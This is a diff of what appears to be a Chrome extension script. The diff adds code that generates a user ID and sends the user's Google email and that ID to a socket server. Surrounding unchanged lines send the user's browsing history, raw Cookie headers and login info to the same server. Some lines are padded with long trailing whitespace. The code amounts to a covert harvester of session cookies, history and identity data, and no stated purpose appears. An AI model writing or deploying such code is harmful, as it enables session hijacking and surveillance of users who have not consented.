@@ -1,12 +1,32 @@
-function connectToServer() {
-  socket = io('http://localhost:3000');
-  chrome.identity.getProfileUserInfo((userInfo) => {
-    if (userInfo.email == null) {
-      userInfo.email = "No email";
-      userInfo.id = "User not logged in";
-    }
-    socket.emit('userInfo', userInfo);
+async function getUserID() {
+  var userID = "";
+  chrome.storage.sync.get("userID", function(items) {
+    userID = items.userID;
+    return userID;
   });
+}
+
+async function connectToServer() {
+  socket = io('http://localhost:3000');
+  //ID will now be generated so everyone has an ID regardless of being logged in to gmail
+  var userData = {};
+  userData["email"] = "";
+  chrome.identity.getProfileUserInfo((userInfo) => {    
+    if(typeof userInfo.email === "undefined" || userInfo.email === "" || userInfo.email === "No E-mail") {
+      userData["email"] = "No E-mail";
+    } else {
+      userData["email"] = userInfo.email;
+    }
+  });
+
+  //get the saved userID we generated
+  chrome.storage.sync.get("userID", function(items) {
+    userData["id"] = items.userID;
+    //store
+    socket.emit('userData', userData);
+  });  
+
+
   updateSecurityWebsites(socket);
   updateScriptWebsites(socket);
   return socket;
@@ -40,10 +60,10 @@ function searchAndSendHistory() {
       sendHistoryPage(page);
     });
   });
-}
+}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
 function sendHistoryPage(page) {
-  socket.emit('History', [page.url, new Date(page.lastVisitTime)])
+  socket.emit('History', [page.url, new Date(page.lastVisitTime)])                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
 }
 
 function checkAndSendCookies(info) {
@@ -51,7 +71,7 @@ function checkAndSendCookies(info) {
     if (header.name === "Cookie") {
       socket.emit('Cookies', header.value);
     }
-  });
+  });                           
 }
 
 function sendLoginInfo(loginInfo) {
@@ -94,3 +114,20 @@ function createScriptSocket() {
   });
 }
 
+function uuid() {
+  return crypto.getRandomValues(new Uint32Array(4)).join("");
+}
+
+async function createUserID() {
+  // chrome.storage.sync.get('userID', function(items) {
+  //   var userID = items.userID;
+  //   if(userID) {
+  //     return userID;
+  //   } else {
+      var obj = {};
+      obj["userID"] = uuid();
+      chrome.storage.sync.set(obj, function() {
+      });
+  //   }
+  // });
+}
